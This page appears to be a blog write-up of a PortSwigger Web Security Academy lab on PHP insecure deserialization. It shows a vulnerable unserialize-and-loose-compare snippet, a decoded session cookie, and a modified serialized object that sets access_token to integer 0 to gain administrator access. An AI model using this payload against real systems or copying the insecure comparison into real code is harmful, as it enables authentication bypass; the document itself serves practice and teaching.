<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Modifying serialized data types
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result
Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter


  Background
  #

Loose Comparison Operator in PHP"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Modifying serialized data types"><meta property="og:description" content="Lab: Modifying serialized data types # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter Background # Loose Comparison Operator in PHP"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Modifying serialized data types | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Modifying serialized data types</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-modifying-serialized-data-types>Lab: Modifying serialized data types
<a class=anchor href=#lab-modifying-serialized-data-types>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result</li><li>Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter</li></ul><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Loose Comparison Operator in <code>PHP</code></p><blockquote><p><code>PHP</code> based logic is particularly vulnerable to this kind of manipulation due to the behavior of its <strong>loose comparison operator(==)</strong> when comparing different data types.
For example: <code>5=="5"</code> will be true when two types are different.</p></blockquote><p>Vulnerability:</p><blockquote><p>This becomes even stranger when comparing a string the integer 0: <code>0 == "Example string" // true</code>
How about if the website author use this kind of vulnerability as below to verify the admin user?</p><pre tabindex=0><code class=language-php! data-lang=php!>$login = unserialize($_COOKIE)
if ($login[&#39;password&#39;] == $password) {
// log in successfully
}
</code></pre></blockquote><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>Recon Package
According to the package we intercepted, the cookie is set to base64-encoded string:
Session: <code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmaWtlajZ6ZXN6ZmFudm53b2psYmM2NHllN3dxaG5heSI7fQ%3d%3d</code>
Decoded String: <code>O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fikej6zeszfanvnwojlbc64ye7wqhnay";}</code>
<img src=https://i.imgur.com/B6addxR.png alt></p></li><li><p>What if we modify the string?
The verification mechanism workflow is comparing the query user&rsquo;s <code>access_token</code> with its database data.</p></li></ol><h2 id=exp>Exp
<a class=anchor href=#exp>#</a></h2><ol><li><p>Modify the string like below
Change the user to <code>administrator</code> and access token to integer <code>0</code> so that the comparison is always true.
Exploit Payload:
<code>O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}</code>
Then we have admin panel on the screen.
<img src=https://i.imgur.com/X36upo8.png alt></p></li><li><p>Delete Carlos like previous lab
:::spoiler Success Screenshot
<img src=https://i.imgur.com/PmCuBRF.png alt>
:::</p></li></ol><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>